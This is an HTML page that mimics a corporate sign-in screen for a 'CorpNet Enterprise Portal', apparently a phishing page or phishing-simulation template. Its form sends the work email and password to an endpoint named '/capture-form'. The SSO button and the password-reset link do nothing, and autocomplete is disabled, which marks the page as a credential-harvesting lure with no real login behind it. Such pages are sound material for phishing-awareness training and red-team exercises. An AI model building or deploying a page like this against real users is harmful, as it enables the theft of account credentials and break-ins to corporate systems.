<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in – CorpNet Portal</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0f0f13;
      font-family: 'Segoe UI', system-ui, sans-serif;
      color: #e2e2e2;
    }

    .bg-grid {
      position: fixed; inset: 0; z-index: 0;
      background-image:
        linear-gradient(rgba(99,102,241,.06) 1px, transparent 1px),
        linear-gradient(90deg, rgba(99,102,241,.06) 1px, transparent 1px);
      background-size: 40px 40px;
    }

    .card {
      position: relative; z-index: 1;
      background: #16161f;
      border: 1px solid #2a2a3a;
      border-radius: 12px;
      padding: 40px 44px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 24px 64px rgba(0,0,0,.5);
    }

    .logo {
      display: flex; align-items: center; gap: 10px;
      margin-bottom: 32px;
    }
    .logo-icon {
      width: 36px; height: 36px; border-radius: 8px;
      background: linear-gradient(135deg, #6366f1, #8b5cf6);
      display: flex; align-items: center; justify-content: center;
      font-size: 18px;
    }
    .logo-name { font-size: 17px; font-weight: 600; color: #fff; }
    .logo-sub  { font-size: 12px; color: #666; }

    h1 { font-size: 22px; font-weight: 600; color: #fff; margin-bottom: 6px; }
    .subtitle { font-size: 13px; color: #666; margin-bottom: 28px; }

    label { display: block; font-size: 12px; color: #888; margin-bottom: 6px; }

    input[type="text"],
    input[type="email"],
    input[type="password"] {
      width: 100%; padding: 10px 14px;
      background: #0f0f13;
      border: 1px solid #2a2a3a;
      border-radius: 7px;
      color: #e2e2e2;
      font-size: 14px;
      outline: none;
      transition: border-color .15s;
      margin-bottom: 18px;
    }
    input:focus { border-color: #6366f1; }

    .remember {
      display: flex; align-items: center; gap: 8px;
      font-size: 13px; color: #888; margin-bottom: 24px;
    }
    .remember input { width: auto; margin: 0; }

    button[type="submit"] {
      width: 100%; padding: 11px;
      background: linear-gradient(135deg, #6366f1, #8b5cf6);
      border: none; border-radius: 7px;
      color: #fff; font-size: 14px; font-weight: 600;
      cursor: pointer; transition: opacity .15s;
    }
    button[type="submit"]:hover { opacity: .88; }

    .footer {
      margin-top: 24px; text-align: center;
      font-size: 12px; color: #555;
    }
    .footer a { color: #6366f1; text-decoration: none; }

    .divider {
      border: none; border-top: 1px solid #2a2a3a;
      margin: 24px 0;
    }

    .sso-btn {
      width: 100%; padding: 10px;
      background: #1e1e2a; border: 1px solid #2a2a3a;
      border-radius: 7px; color: #ccc;
      font-size: 13px; cursor: pointer;
      display: flex; align-items: center; justify-content: center; gap: 8px;
      transition: border-color .15s;
    }
    .sso-btn:hover { border-color: #444; }
  </style>
</head>
<body>
  <div class="bg-grid"></div>
  <div class="card">
    <div class="logo">
      <div class="logo-icon">🔐</div>
      <div>
        <div class="logo-name">CorpNet</div>
        <div class="logo-sub">Enterprise Portal</div>
      </div>
    </div>

    <h1>Welcome back</h1>
    <p class="subtitle">Sign in to your corporate account</p>

    <form action="/capture-form" method="POST">
      <label for="email">Work email</label>
      <input type="email" id="email" name="email" placeholder="you@company.com" autocomplete="off">

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="••••••••" autocomplete="off">

      <div class="remember">
        <input type="checkbox" id="remember" name="remember" value="1">
        <label for="remember" style="margin:0">Keep me signed in</label>
      </div>

      <button type="submit">Sign in</button>
    </form>

    <hr class="divider">

    <button class="sso-btn" onclick="return false;">
      <span>🏢</span> Continue with SSO
    </button>

    <p class="footer">
      Forgot password? <a href="#">Reset here</a>
    </p>
  </div>
</body>
</html>
